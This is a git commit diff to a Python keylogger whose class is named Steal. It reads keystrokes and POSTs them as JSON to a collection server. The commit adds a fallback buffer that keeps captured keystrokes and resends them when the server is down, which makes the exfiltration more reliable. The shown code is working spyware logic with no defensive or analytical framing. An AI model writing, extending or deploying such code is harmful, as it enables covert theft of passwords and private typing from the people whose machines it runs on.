14bf3b6e4c608df415d5e9a0f7930bdb267981d4
DATK <pasha.dark.dog@gmial.com>
2023-12-08 22:07:06 +0300

    saving data if srv not work

--- main.py
+++ main.py
@@ -6,13 +6,21 @@ class Steal:
     def __init__(self,server="http://127.0.0.1:5000/getin/it/data"):
         self.server=server
         self.data=[]
-        self.limit=150
+        self.bug=[]
+        self.limit=100
         
     def get_key(self):
         return kb.read_key()
     
     def send(self):
-        requests.post(self.server,json={"data":self.data})
+        
+        try:
+            requests.post(self.server,json={"data":self.data})
+            if self.bug!=[]:
+                requests.post(self.server,json={"data":self.bug})
+                self.bug.clear()
+        except:
+            self.bug.extend(self.data)
     
     def run(self):
         while True:
